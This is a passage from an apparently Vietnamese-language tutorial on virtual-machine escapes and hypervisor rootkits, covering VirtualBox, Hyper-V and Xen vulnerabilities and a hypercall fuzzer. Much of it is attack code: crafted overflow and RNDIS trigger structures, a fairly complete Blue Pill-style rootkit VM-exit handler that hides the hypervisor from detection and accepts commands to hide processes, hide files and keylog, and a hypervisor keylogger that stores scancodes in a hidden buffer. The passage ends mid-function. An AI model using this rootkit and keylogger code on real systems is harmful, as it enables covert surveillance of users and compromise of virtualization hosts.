void send_chromium_command(int vboxguest_fd, uint32_t client_id,
                           void *cmd_buf, size_t cmd_len,
                           void *reply_buf, size_t reply_len) {
    VMMDevHGCMCall call;
    HGCMFunctionParameter parms[2];
    
    call.u32ClientID = client_id;
    call.u32Function = SHCRGL_GUEST_FN_WRITE_READ;
    call.cParms = 2;
    
    /* Parameter 0: command buffer (write) */
    parms[0].type = 0;  /* VMMDevHGCMParmType_LinAddr */
    parms[0].u.Pointer.size = cmd_len;
    /* parms[0].u.Pointer.u.linearAddr = cmd_buf; */
    
    /* Parameter 1: reply buffer (read) */
    parms[1].type = 0;
    parms[1].u.Pointer.size = reply_len;
    /* parms[1].u.Pointer.u.linearAddr = reply_buf; */
    
    /* Submit via ioctl */
    /* ioctl(vboxguest_fd, VBOXGUEST_IOCTL_HGCM_CALL, &call); */
}
```

---

### 5.4 CVE-2019-2525/2548 — Chromium 3D Integer Overflow Detail

```c
/*
 * Chi tiết kỹ thuật bổ sung cho exploit chain ở 5.3:
 *
 * CVE-2019-2525 (Info Leak) — crServerDispatchReadPixels():
 * - Không clear output buffer trước khi fill
 * - Nếu glReadPixels trả ít data hơn buffer size 
 *   → uninitialized heap bytes leak
 * - Guest đọc reply → host heap pointers → defeat ASLR
 *
 * CVE-2019-2548 (Integer Overflow) — crServerDispatchTexImage2D():
 * - Tính buffer: width * height * bpp
 * - Integer overflow: 0x10000 * 0x10000 * 4 = 0x400000000
 *   → truncated to 32-bit → 0x00000000!
 * - Host allocates 0 bytes, copies enormous data → heap overflow
 */

/* Crafted texture command trigger overflow */
#define CR_TEXIMAGE2D_OPCODE  0x42

struct cr_teximage2d_cmd {
    uint8_t  opcode;
    uint32_t target;
    int32_t  level;
    int32_t  internalformat;
    int32_t  width;     /* 0x10000 — causes integer overflow */
    int32_t  height;    /* 0x10000 */
    int32_t  border;
    uint32_t format;    /* GL_RGBA = 4 components */
    uint32_t type;      /* GL_UNSIGNED_BYTE = 1 byte */
    /* width * height * 4 * 1 = 0x400000000 → wraps to 0 on 32-bit */
};
```

### 5.5 CVE-2020-2902 — VirtualBox 3D Acceleration UAF

```c
/*
 * CVE-2020-2902 — VirtualBox VMSVGA 3D acceleration Use-After-Free
 * CVSS: 8.2
 *
 * After VBox 6.0 switched from Chromium to VMSVGA for 3D:
 * - VMSVGA device handles 3D commands from guest
 * - Surface objects allocated/freed dynamically
 * - Race between surface destroy and surface reference in command buffer
 * → Use-after-free khi VMSVGA processes stale surface ID
 *
 * Exploit: heap spray to reclaim freed surface memory,
 * place fake surface with controlled function pointers
 */
```

### 5.6 CVE-2021-2145/2310 — VirtualBox NAT Integer Underflow

```c
/*
 * CVE-2021-2145 — VirtualBox NAT Network Integer Underflow
 * CVE-2021-2310 — VirtualBox NAT Network Heap Overflow
 *
 * VBox NAT (user-mode networking, tương tự QEMU SLiRP):
 * - Parse network packets từ guest
 * - Integer underflow trong TCP/UDP length calculation
 *   → Negative/huge length → memcpy with wrong size → heap overflow
 *
 * Attack: Guest gửi crafted network packets → NAT stack overflow
 * → Code execution trong VirtualBox process trên host
 *
 * Tương tự pattern như QEMU SLiRP bugs (CVE-2019-6778)
 * → Network parsing code là repeated attack surface across all VMMs
 */
```

---

## Phần 6: Hyper-V Escape

### 6.1 Hyper-V Architecture

```
┌─────────────────────────────────────────────────────────┐
│                  Hyper-V Architecture                    │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │  Root        │  │  Child       │  │  Child       │  │
│  │  Partition   │  │  Partition 1 │  │  Partition 2 │  │
│  │  (Parent)    │  │  (Guest VM)  │  │  (Guest VM)  │  │
│  │              │  │              │  │              │  │
│  │  Windows     │  │  Windows/    │  │  Linux       │  │
│  │  Server +    │  │  Linux       │  │              │  │
│  │  VMM Service │  │              │  │              │  │
│  │  (vmms.exe)  │  │              │  │              │  │
│  │  VM Worker   │  │              │  │              │  │
│  │  (vmwp.exe)  │  │              │  │              │  │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘  │
│         │                 │                  │          │
│  ═══════╪═════════════════╪══════════════════╪══════    │
│         │      VMBus      │      VMBus       │          │
│  ═══════╪═════════════════╪══════════════════╪══════    │
│         │                 │                  │          │
│  ┌──────┴────────────────────────────────────┴──────┐  │
│  │              Hyper-V Hypervisor                   │  │
│  │                                                    │  │
│  │  ┌────────────────┐  ┌──────────────────────┐     │  │
│  │  │ Hypercall      │  │ Intercept Handler    │     │  │
│  │  │ Interface      │  │ (I/O, MSR, CPUID)   │     │  │
│  │  └────────────────┘  └──────────────────────┘     │  │
│  │  ┌────────────────┐  ┌──────────────────────┐     │  │
│  │  │ Memory Mgmt    │  │ Virtual Processor    │     │  │
│  │  │ (SLAT/EPT)     │  │ Management           │     │  │
│  │  └────────────────┘  └──────────────────────┘     │  │
│  │  ┌────────────────┐  ┌──────────────────────┐     │  │
│  │  │ VMBus          │  │ Synthetic Devices    │     │  │
│  │  │ (inter-part.)  │  │ (VSP ↔ VSC)         │     │  │
│  │  └────────────────┘  └──────────────────────┘     │  │
│  └───────────────────────────────────────────────────┘  │
│                                                          │
│  Hardware (CPU + VT-x/AMD-V + VT-d/IOMMU)              │
└─────────────────────────────────────────────────────────┘

Hyper-V Attack Surface:
1. Hypercall interface (VMCALL instruction)
2. VMBus channels (synthetic device communication)
3. Synthetic devices (VSP - Virtual Service Provider)
   ├── vmswitch.sys (networking)
   ├── storvsp.sys (storage)
   ├── VMBusVideoM.sys (video)
   └── Integration services
4. Emulated devices (legacy, for compatibility)
5. vmwp.exe worker process (per-VM, user-mode)
```

### 6.2 Hyper-V Hypercall Interface & CVE-2018-0886 (CredSSP)

```
CVE-2018-0886 — CredSSP Remote Code Execution
Không phải VM escape trực tiếp, nhưng ảnh hưởng Hyper-V:
- CredSSP protocol dùng cho authentication trong RDP/WinRM
- Hyper-V Enhanced Session Mode dùng RDP → dùng CredSSP
- MitM attack trên CredSSP → credential theft
- Attacker có credentials → access Hyper-V management
Impact: Lateral movement vào Hyper-V infrastructure
```

#### Hypercall Interface Detail

```c
/*
 * hyperv_hypercall.c — Hyper-V hypercall interface from guest
 *
 * Hyper-V hypercalls:
 * - Fast hypercall: register-based (small data)
 * - Slow hypercall: memory-based (large data, GPA of input/output pages)
 *
 * Input: RCX = hypercall code, RDX = input GPA
 * Output: RAX = result
 */

#include <stdio.h>
#include <stdint.h>

/* Hypercall input value format:
 * Bits 15:0   - Call code
 * Bit  16     - Fast (1) or slow (0)
 * Bits 25:17  - Variable header size / 8
 * Bit  26     - Rep call
 * Bits 31:27  - Reserved
 * Bits 43:32  - Rep count
 * Bits 47:44  - Reserved  
 * Bits 59:48  - Rep start index
 * Bits 63:60  - Reserved
 */

#define HV_HYPERCALL_FAST    (1ULL << 16)

/* Important hypercall codes */
#define HVCALL_NOTIFY_LONG_SPIN_WAIT         0x0008
#define HVCALL_POST_MESSAGE                  0x005C
#define HVCALL_SIGNAL_EVENT                  0x005D
#define HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE   0x0002
#define HVCALL_FLUSH_VIRTUAL_ADDRESS_LIST    0x0003
#define HVCALL_SWITCH_VIRTUAL_ADDRESS_SPACE  0x0001
#define HVCALL_SEND_SYNTHETIC_CLUSTER_IPI    0x000B
#define HVCALL_MODIFY_SPARSE_GPA_PAGE_HOST_VISIBILITY 0x00DB
#define HVCALL_MEMORY_MAPPED_IO_READ         0x0106
#define HVCALL_MEMORY_MAPPED_IO_WRITE        0x0107

/* Fast hypercall (register-based) */
static inline uint64_t hv_do_fast_hypercall(uint16_t code, uint64_t input1, 
                                             uint64_t input2) {
    uint64_t hv_status;
    uint64_t control = (uint64_t)code | HV_HYPERCALL_FAST;
    
    __asm__ volatile(
        "mov %3, %%r8\n\t"
        "vmcall"
        : "=a"(hv_status)
        : "c"(control), "d"(input1), "r"(input2)
        : "r8", "memory"
    );
    
    return hv_status;
}

/* Slow hypercall (memory-based) */
static inline uint64_t hv_do_hypercall(uint16_t code, void *input_page, 
                                        void *output_page) {
    uint64_t hv_status;
    uint64_t control = (uint64_t)code;
    uint64_t input_gpa = virt_to_phys(input_page);
    uint64_t output_gpa = output_page ? virt_to_phys(output_page) : 0;
    
    __asm__ volatile(
        "mov %3, %%r8\n\t"
        "vmcall"
        : "=a"(hv_status)
        : "c"(control), "d"(input_gpa), "r"(output_gpa)
        : "r8", "memory"
    );
    
    return hv_status;
}
```

### 6.3 CVE-2020-0904 & RemoteFX vGPU Vulnerabilities

```
CVE-2020-0904 — Hyper-V Denial of Service
- Guest sends crafted data to host → host crash
- RemoteFX vGPU: NHIỀU CVEs nghiêm trọng khiến Microsoft deprecate hoàn toàn:
  CVE-2020-1036, CVE-2020-1032, CVE-2020-1040, CVE-2020-1041,
  CVE-2020-1043, CVE-2020-1080 — ALL Critical RCE via RemoteFX
  
- Sau series CVEs này, Microsoft:
  1. Disabled RemoteFX vGPU in Windows Update (July 2020)
  2. Completely removed in Windows Server 2025
  3. Recommended GPU-PV (GPU Partitioning) thay thế

Lesson: Complex GPU virtualization = massive attack surface.
Microsoft chọn kill entire feature thay vì fix liên tục.
```

### 6.4 CVE-2021-28476 — Hyper-V vmswitch RCE

```c
/*
 * CVE-2021-28476 — Hyper-V vmswitch.sys Remote Code Execution
 * CVSS: 9.9 (Critical)
 *
 * Bug: vmswitch.sys (virtual network switch) xử lý
 * OID (Object Identifier) request từ guest sai.
 * Guest gửi crafted RNDIS (Remote NDIS) message
 * qua VMBus → vmswitch.sys dereference attacker-controlled pointer.
 *
 * Impact: Guest → Host code execution (ring-0 trong hypervisor!)
 *
 * Exploitation:
 * 1. Guest tạo RNDIS adapter (synthetic NIC)
 * 2. Gửi RNDIS SET OID message với crafted OID
 * 3. vmswitch.sys reads pointer từ OID data
 * 4. Pointer dereference → arbitrary kernel read
 * 5. Chain với write primitive → kernel code execution
 */

/*
 * RNDIS (Remote NDIS) protocol qua VMBus:
 * 
 * Guest loads netvsc driver → connects to VMBus channel
 * → sends RNDIS messages to vmswitch.sys in root partition
 */

/* RNDIS message types */
#define RNDIS_MSG_INIT          0x00000002
#define RNDIS_MSG_QUERY         0x00000004
#define RNDIS_MSG_SET           0x00000005  /* <-- attack vector */
#define RNDIS_MSG_INDICATE      0x00000007
#define RNDIS_MSG_PACKET        0x00000001

/* RNDIS SET message structure */
typedef struct {
    uint32_t msg_type;          /* RNDIS_MSG_SET */
    uint32_t msg_len;
    uint32_t request_id;
    uint32_t oid;               /* Object Identifier — crafted value */
    uint32_t info_buf_len;
    uint32_t info_buf_offset;
    uint32_t dev_vc_handle;
} rndis_set_request_t;

/*
 * Vulnerable OID: OID_SWITCH_NIC_REQUEST (0x000100XX range)
 * 
 * vmswitch.sys code (pseudocode from reverse engineering):
 *
 * NTSTATUS VmsExtOidRequest(SWITCH_NIC *nic, NDIS_OID_REQUEST *oidReq) {
 *     ...
 *     // oidReq comes from guest RNDIS message
 *     PVOID infoBuffer = oidReq->DATA.SET_INFORMATION.InformationBuffer;
 *     
 *     // Bug: infoBuffer points to guest-controlled data
 *     // which contains a pointer that vmswitch dereferences
 *     PSWITCH_NIC_OID_REQUEST switchReq = (PSWITCH_NIC_OID_REQUEST)infoBuffer;
 *     
 *     // This dereferences switchReq->SourceNicIndex without validation
 *     PSWITCH_NIC sourceNic = SwitchFindNic(switch, switchReq->SourceNicIndex);
 *     
 *     // Worse: some code paths dereference pointers WITHIN the guest data
 *     // directly, leading to arbitrary kernel read/write
 *     ...
 * }
 *
 * Guest controls:
 * 1. OID value → selects code path
 * 2. InformationBuffer content → contains fake structure with pointers
 * 3. vmswitch dereferences these pointers → controlled read/write!
 */

/* VMBus channel communication from guest */
void send_rndis_set(int vmbus_fd, uint32_t target_oid, 
                     void *data, size_t data_len) {
    rndis_set_request_t req;
    memset(&req, 0, sizeof(req));
    
    req.msg_type = RNDIS_MSG_SET;
    req.msg_len = sizeof(req) + data_len;
    req.request_id = 1;
    req.oid = target_oid;
    req.info_buf_len = data_len;
    req.info_buf_offset = sizeof(req) - 8;  /* Offset from request_id */
    
    /* Send via VMBus ring buffer */
    /* vmbus_send(vmbus_fd, &req, sizeof(req), data, data_len); */
}
```

### 6.5 CVE-2022-21907 & Hyper-V Network Stack

```
CVE-2022-21907 — HTTP.sys Remote Code Execution
CVSS: 9.8 (Critical), "wormable"

Không phải VM escape trực tiếp, nhưng critical cho Hyper-V:
- HTTP.sys chạy trong kernel, xử lý HTTP requests
- Hyper-V management API sử dụng HTTP.sys
- Crafted HTTP request → pre-auth RCE trên Hyper-V host
- "Wormable" — có thể tự lan truyền

Attack scenario cho Hyper-V:
1. Attacker trên network (không cần ở trong VM)
2. Gửi crafted HTTP request tới Hyper-V management port
3. HTTP.sys bug → kernel code execution trên host
4. Full access tất cả VMs trên host

Defense: Patch immediately, restrict management network access
```

### 6.6 Hypercall Fuzzing — hAFL2 Method

```python
"""
hyperv_fuzzer.py — Phương pháp fuzz Hyper-V hypercalls

Microsoft tự dùng tool tương tự để tìm bugs.
hAFL2 (by SafeBreach Labs) là open-source alternative.

Architecture:
1. Modified QEMU emulates Hyper-V environment
2. AFL++ provides coverage feedback
3. Fuzzer generates hypercall inputs
4. Monitor Hyper-V hypervisor for crashes

Hoặc dùng kLaFL/Nyx cho kernel fuzzing.
"""

# Simplified hypercall fuzzer concept
import struct
import random

class HypercallFuzzer:
    """Generate mutated hypercall inputs for fuzzing Hyper-V."""
    
    # Known hypercall codes to target
    HYPERCALLS = [
        0x0001,  # HvSwitchVirtualAddressSpace
        0x0002,  # HvFlushVirtualAddressSpace  
        0x0003,  # HvFlushVirtualAddressList
        0x0008,  # HvNotifyLongSpinWait
        0x0009,  # HvPostMessage (removed)
        0x000B,  # HvSendSyntheticClusterIpi
        0x005C,  # HvPostMessage
        0x005D,  # HvSignalEvent
        0x0050,  # HvModifyVtlProtectionMask
        0x00DB,  # HvModifySparseGpaPageHostVisibility
        0x0106,  # HvMemoryMappedIoRead
        0x0107,  # HvMemoryMappedIoWrite
    ]
    
    def generate_input(self):
        """Generate one fuzzed hypercall input."""
        code = random.choice(self.HYPERCALLS)
        is_fast = random.choice([True, False])
        
        if is_fast:
            # Fast hypercall: 2 register inputs (128 bits)
            input1 = random.getrandbits(64)
            input2 = random.getrandbits(64)
            return {
                'type': 'fast',
                'code': code,
                'input1': input1,
                'input2': input2,
            }
        else:
            # Slow hypercall: input page (4096 bytes)
            input_page = bytearray(random.getrandbits(8) for _ in range(4096))
            return {
                'type': 'slow',
                'code': code,
                'input_page': input_page,
            }
    
    def mutate_input(self, inp):
        """Mutate an existing input (AFL-style)."""
        if inp['type'] == 'fast':
            # Bit flip, byte flip, interesting values
            field = random.choice(['input1', 'input2'])
            mutation = random.choice([
                lambda x: x ^ (1 << random.randint(0, 63)),  # bit flip
                lambda x: x ^ (0xFF << (random.randint(0, 7) * 8)),  # byte flip
                lambda x: random.choice([0, 0xFFFFFFFFFFFFFFFF, 
                                          0x7FFFFFFFFFFFFFFF, 1]),  # interesting
            ])
            inp[field] = mutation(inp[field]) & 0xFFFFFFFFFFFFFFFF
        else:
            # Mutate input page
            page = inp['input_page']
            pos = random.randint(0, len(page) - 1)
            page[pos] = random.randint(0, 255)
        
        return inp
```

---

## Phần 7: Xen Escape

### 7.1 Xen Architecture

```
Xen dùng micro-kernel approach:

┌──────────┐ ┌──────────┐ ┌──────────┐
│  Dom0    │ │  DomU    │ │  DomU    │
│ (privil.)│ │ (guest)  │ │ (guest)  │
│          │ │          │ │          │
│ Backend  │ │ Frontend │ │ Frontend │
│ drivers  │ │ drivers  │ │ drivers  │
└────┬─────┘ └────┬─────┘ └────┬─────┘
     │            │             │
═════╪════════════╪═════════════╪═══════ (Event channels, Grant tables)
     │            │             │
┌────┴────────────┴─────────────┴──────┐
│           Xen Hypervisor             │
│  ┌─────────┐ ┌────────┐ ┌────────┐  │
│  │Scheduler│ │ MMU    │ │Hypercal│  │
│  │         │ │        │ │Handler │  │
│  └─────────┘ └────────┘ └────────┘  │
│  ┌─────────────────────────────────┐ │
│  │ Grant Table / Event Channels   │ │
│  └─────────────────────────────────┘ │
└──────────────────────────────────────┘

Xen Attack Surface:
1. Hypercalls (40+ system calls to hypervisor)
2. Grant tables (shared memory between domains)
3. Event channels (inter-domain signaling)
4. IOMMU management
5. Para-virtual device backends (in Dom0)
6. PV network/block/console frontends
7. Emulated devices (QEMU in stubdomain)
```

### 7.2 XSA (Xen Security Advisories) — Notable Escapes

```
Important XSAs for VM Escape research:

XSA-148 (CVE-2015-7835) — x86 PV guest → hypervisor
  Bug: Missing validation in page table updates
  Impact: Guest can modify hypervisor page tables
  → Full Xen compromise from unprivileged PV guest

XSA-182 (CVE-2016-6258) — PV pagetable race
  Bug: Race condition in PV page table management
  → Guest can gain hypervisor privileges

XSA-212 (CVE-2017-10912) — Grant table race
  Bug: Page reference counting error in grant table ops
  → Guest can map pages it shouldn't access

XSA-231 (CVE-2017-15592) — x86 PV shadow paging bug
  Bug: Recursive pagetable handling flaw
  → Guest can write to hypervisor memory

XSA-295 (CVE-2019-17340) — Grant table ref counting
  Bug: Multiple reference counting issues
  → Guest-to-host escape

XSA-321 (CVE-2020-25603) — Missing unlock in event channel
  Bug: Error path doesn't unlock → deadlock or worse
  → DoS or information disclosure
```

---

### 7.3 CVE-2017-15592 — Xen Page Table Manipulation

```c
/*
 * XSA-231 / CVE-2017-15592 — Xen x86 PV shadow paging vulnerability
 *
 * Bug: Recursive page table handling trong Xen's shadow paging code.
 * Xen tracks guest page tables bằng "shadow" copies.
 * Khi guest tạo recursive page table entry (PDE points to itself),
 * Xen shadow code đi vào infinite recursion hoặc xử lý sai.
 *
 * Impact: 
 * - Unprivileged PV guest có thể ghi vào Xen hypervisor memory
 * - Full Xen compromise → control tất cả VMs trên host
 *
 * Exploit concept:
 * 1. Guest tạo page table với self-referencing entry
 * 2. Guest triggers shadow page table update (TLB flush, etc.)  
 * 3. Xen shadow code follows recursive entry
 * 4. Off-by-one hoặc wrong level detection → ghi sai vào shadow
 * 5. Controlled shadow entry → map Xen memory vào guest
 *
 * Chỉ ảnh hưởng PV guests (paravirtualized), KHÔNG ảnh HVM guests
 * Qubes OS (dùng Xen PV) đặc biệt bị ảnh hưởng
 */

/* Tạo recursive page table entry (x86_64 4-level paging) */
/*
 * PML4[511] = physical_address_of_PML4 | PRESENT | WRITABLE
 * → Accessing virtual address 0xFFFF...FF recursively walks 
 *   back to the same page table → Xen shadow code confused
 */
```

---

## Phần 8: Hypervisor Rootkit

### 8.1 Blue Pill (Joanna Rutkowska, 2006)

```c
/*
 * blue_pill.c — Conceptual implementation of Blue Pill rootkit
 *
 * Idea: Install a thin hypervisor UNDER the running OS
 * OS doesn't know it's now running in a VM
 * Hypervisor intercepts sensitive operations transparently
 *
 * Original concept by Joanna Rutkowska (2006)
 * Required: CPU with VT-x (AMD-V in original)
 *
 * Đây là "hyperjacking" — subvert OS bằng cách
 * biến nó thành guest mà nó không biết
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/vmx.h>

/* 
 * Step 1: Allocate VMXON region and VMCS
 * Step 2: Enable VMX operation
 * Step 3: Set up VMCS with current CPU state as guest state
 * Step 4: VMLAUNCH → OS now runs as guest
 * Step 5: Intercept sensitive operations via VM Exit
 */

/* Minimal VMCS setup to "blue pill" the current OS */
struct blue_pill_state {
    void *vmxon_region;      /* 4KB aligned */
    void *vmcs_region;       /* 4KB aligned */
    void *host_stack;        /* Stack for VM exit handler */
    uint64_t host_cr3;       /* Hypervisor page tables */
    
    /* Saved guest (original OS) state */
    uint64_t guest_rsp;
    uint64_t guest_rip;
    uint64_t guest_rflags;
    uint64_t guest_cr0;
    uint64_t guest_cr3;
    uint64_t guest_cr4;
};

/*
 * VM Exit Handler — intercept operations transparently
 * Mục tiêu: OS không phát hiện mình đang ở trong VM
 */
void __attribute__((naked)) vm_exit_handler(void) {
    __asm__ volatile(
        /* Save all registers */
        "push %%rax\n\t"
        "push %%rcx\n\t"
        "push %%rdx\n\t"
        "push %%rbx\n\t"
        "push %%rbp\n\t"
        "push %%rsi\n\t"
        "push %%rdi\n\t"
        "push %%r8\n\t"
        "push %%r9\n\t"
        "push %%r10\n\t"
        "push %%r11\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"
        
        "mov %%rsp, %%rdi\n\t"  /* Pass register frame as arg */
        "call handle_vm_exit\n\t"
        
        /* Restore and resume */
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%r11\n\t"
        "pop %%r10\n\t"
        "pop %%r9\n\t"
        "pop %%r8\n\t"
        "pop %%rdi\n\t"
        "pop %%rsi\n\t"
        "pop %%rbp\n\t"
        "pop %%rbx\n\t"
        "pop %%rdx\n\t"
        "pop %%rcx\n\t"
        "pop %%rax\n\t"
        
        "vmresume\n\t"  /* Re-enter guest (OS) */
        ::
    );
}

struct register_frame {
    uint64_t r15, r14, r13, r12, r11, r10, r9, r8;
    uint64_t rdi, rsi, rbp, rbx, rdx, rcx, rax;
};

void handle_vm_exit(struct register_frame *regs) {
    uint64_t exit_reason;
    uint64_t exit_qualification;
    
    /* Read exit reason from VMCS */
    __asm__ volatile("vmread %1, %0" : "=r"(exit_reason) : "r"((uint64_t)0x4402));
    __asm__ volatile("vmread %1, %0" : "=r"(exit_qualification) : "r"((uint64_t)0x6400));
    
    switch (exit_reason & 0xFFFF) {
    case 10:  /* CPUID */
        handle_cpuid(regs);
        break;
        
    case 18:  /* VMCALL — used for rootkit communication */
        handle_vmcall(regs);
        break;
        
    case 28:  /* CR access — hide hypervisor from CR4 check */
        handle_cr_access(regs, exit_qualification);
        break;
        
    case 31:  /* RDMSR — hide VMX MSRs */
        handle_rdmsr(regs);
        break;
        
    case 32:  /* WRMSR */
        handle_wrmsr(regs);
        break;
        
    default:
        /* Pass through transparently */
        break;
    }
    
    /* Advance guest RIP past the causing instruction */
    uint64_t rip, insn_len;
    __asm__ volatile("vmread %1, %0" : "=r"(rip) : "r"((uint64_t)0x681E));
    __asm__ volatile("vmread %1, %0" : "=r"(insn_len) : "r"((uint64_t)0x440C));
    rip += insn_len;
    __asm__ volatile("vmwrite %0, %1" :: "r"(rip), "r"((uint64_t)0x681E));
}

/* Hide from CPUID-based VM detection */
void handle_cpuid(struct register_frame *regs) {
    uint32_t leaf = (uint32_t)regs->rax;
    uint32_t eax, ebx, ecx, edx;
    
    /* Execute real CPUID */
    __asm__ volatile("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                     : "a"(leaf), "c"((uint32_t)regs->rcx));
    
    if (leaf == 1) {
        /* Clear hypervisor present bit (ECX bit 31) */
        ecx &= ~(1U << 31);
    }
    
    if (leaf == 0x40000000) {
        /* Hide hypervisor brand — return "GenuineIntel" instead */
        eax = 0;  /* Max hypervisor leaf = 0 (no hypervisor leaves) */
        ebx = 0x756E6547;  /* "Genu" */
        ecx = 0x6C65746E;  /* "ntel" */
        edx = 0x49656E69;  /* "ineI" */
    }
    
    regs->rax = eax;
    regs->rbx = ebx;
    regs->rcx = ecx;
    regs->rdx = edx;
}

/* Rootkit communication via VMCALL */
void handle_vmcall(struct register_frame *regs) {
    uint64_t magic = regs->rax;
    uint64_t cmd = regs->rbx;
    
    if (magic != 0xB100E911ULL) { /* Custom magic value */
        /* Not our call, inject #UD to guest */
        /* inject_exception(6); */  /* #UD */
        return;
    }
    
    switch (cmd) {
    case 0: /* Hide process */
        /* Manipulate guest's task_struct list via EPT */
        /* hide_process(regs->rcx); */
        break;
    case 1: /* Hide file */
        /* Hook guest's VFS via EPT splitting */
        /* hide_file(regs->rcx); */
        break;
    case 2: /* Keylog — intercept keyboard I/O */
        /* enable_keylogger(); */
        break;
    case 3: /* Read arbitrary guest memory */
        /* Qua EPT, hypervisor có thể đọc toàn bộ guest memory */
        /* regs->rax = read_guest_memory(regs->rcx); */
        break;
    }
}

/* Hide VMX-related MSRs from guest */
void handle_rdmsr(struct register_frame *regs) {
    uint32_t msr = (uint32_t)regs->rcx;
    uint32_t lo, hi;
    
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    
    if (msr >= 0x480 && msr <= 0x48C) {
        /* IA32_VMX_* MSRs — return 0 to hide VMX capabilities */
        lo = 0; hi = 0;
    }
    
    regs->rax = lo;
    regs->rdx = hi;
}

/* Forward WRMSR to hardware (hoặc block specific MSRs) */
void handle_wrmsr(struct register_frame *regs) {
    uint32_t msr = (uint32_t)regs->rcx;
    uint32_t lo = (uint32_t)regs->rax;
    uint32_t hi = (uint32_t)regs->rdx;
    
    if (msr >= 0x480 && msr <= 0x48C) {
        return;  /* Block writes to VMX MSRs */
    }
    
    __asm__ volatile("wrmsr" :: "a"(lo), "d"(hi), "c"(msr));
}

/*
 * Anti-detection: CR4 access handler
 * OS có thể check CR4.VMXE bit để detect VMX
 * Blue Pill clears this bit khi guest đọc CR4
 */
void handle_cr_access(struct register_frame *regs, uint64_t qualification) {
    uint8_t cr_num = qualification & 0xF;
    uint8_t access_type = (qualification >> 4) & 0x3;
    uint8_t reg = (qualification >> 8) & 0xF;
    
    if (cr_num == 4 && access_type == 1) {  /* MOV from CR4 */
        uint64_t cr4;
        __asm__ volatile("vmread %1, %0" : "=r"(cr4) : "r"((uint64_t)0x6804));
        cr4 &= ~(1ULL << 13);  /* Clear VMXE bit */
        
        /* Set the appropriate register */
        uint64_t *reg_ptr = (uint64_t *)regs;
        reg_ptr[14 - reg] = cr4;  /* Register mapping */
    }
}
```

### 8.2 SubVirt (Microsoft Research / University of Michigan, 2006)

```
SubVirt — Virtual-Machine Based Rootkit (VMBR)

Khác Blue Pill: SubVirt PERSIST trên disk, survive reboot.

Attack flow:
1. Modify MBR/bootloader trên disk
2. Boot sequence: SubVirt hypervisor loads TRƯỚC OS
3. SubVirt launches original OS as VM guest
4. OS boots "normally" nhưng dưới quyền kiểm soát SubVirt

Implementation:
- Dùng modified VirtualPC hoặc VMware VMM
- Inject vào Windows boot process (ntldr / bootmgr)
- Hoặc inject vào Linux GRUB bootloader

Capabilities:
├── Phishing: modify network traffic transparently (inject HTML)
├── Keylogger: intercept keyboard I/O tại hypervisor level
├── Filesystem: đọc guest disk trực tiếp (bypass encryption nếu key in memory)
├── Memory inspection: đọc toàn bộ guest RAM qua EPT/shadow pages
└── Backdoor: hidden service chạy bên ngoài guest's awareness

Phát hiện:
- Secure Boot (UEFI) — ngăn modify bootloader (NẾU enabled)
- TPM attestation — detect boot chain thay đổi
- Timing analysis — hypervisor thêm latency có thể đo được
- Offline disk analysis — detect modified MBR/bootloader
```

### 8.3 Vitriol — macOS Hypervisor Rootkit

```
Vitriol (Dino Dai Zovi, 2006):
- Presented cùng thời kỳ Blue Pill
- Target: Intel Mac (đời đầu, mới có VT-x)
- Dùng macOS Hypervisor.framework (hoặc raw VMX)
- Concept tương tự Blue Pill nhưng cho macOS

macOS-specific challenges:
- macOS kernel (XNU) có different memory model
- Kext loading cần signing (macOS 10.13+)
- SIP (System Integrity Protection) chặn kernel modification
- T2/Apple Silicon: hardware security khiến hyperjacking khó hơn

Hiện tại: trên Apple Silicon (M1+), hyperjacking
gần như không thể do hardware trust chain.
```

### 8.4 Hypervisor-based Keylogger

```c
/*
 * hv_keylogger.c — Concept: keylogger ở tầng hypervisor
 *
 * Keyboard I/O:
 * - PS/2: Port 0x60 (data), Port 0x64 (status/command)
 * - USB: USB HID interrupt transfers
 *
 * Hypervisor intercept:
 * - Set I/O bitmap trong VMCS để trap Port 0x60 access
 * - Mỗi khi guest đọc Port 0x60 → VM Exit
 * - Hypervisor ghi lại scancode trước khi forward cho guest
 */

/* VMCS I/O bitmap setup */
/*
 * I/O bitmap A: ports 0x0000-0x7FFF (8KB)
 * I/O bitmap B: ports 0x8000-0xFFFF (8KB)
 *
 * Mỗi bit = 1 port, bit=1 → VM Exit khi IN/OUT port đó
 *
 * Để trap keyboard (port 0x60):
 *   io_bitmap_a[0x60 / 8] |= (1 << (0x60 % 8));
 *   // = io_bitmap_a[12] |= (1 << 0); // bit 0 of byte 12
 *
 * Sau đó set VMCS fields:
 *   VMCS_IO_BITMAP_A = physical_addr_of_io_bitmap_a
 *   VMCS_IO_BITMAP_B = physical_addr_of_io_bitmap_b
 *   VMCS_PROC_BASED_CONTROLS |= USE_IO_BITMAPS
 */

/* PS/2 scancode → ASCII (partial, US layout) */
static const char scancode_to_ascii[128] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',
    0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0,
    '*', 0, ' ', /* ... */
};

void handle_keyboard_io_exit(uint64_t exit_qualification,
                              struct register_frame *regs) {
    uint16_t port = (exit_qualification >> 16) & 0xFFFF;
    uint8_t direction = (exit_qualification & 8) ? 1 : 0;  /* 1=IN, 0=OUT */
    
    if (port == 0x60 && direction == 1) {
        /* Guest is reading keyboard data port */
        uint8_t scancode;
        __asm__ volatile("inb %1, %0" : "=a"(scancode) : "Nd"((uint16_t)0x60));
        
        /* Log the keystroke */
        if (!(scancode & 0x80)) {  /* Key press (not release) */
            char ch = scancode_to_ascii[scancode & 0x7F];
            if (ch) {
                /* Store in hidden ring buffer in hypervisor memory */
                /* keylog_buffer[keylog_pos++ % KEYLOG_SIZE] = ch; */
            }
        }
        
        /* Forward scancode to guest transparently */
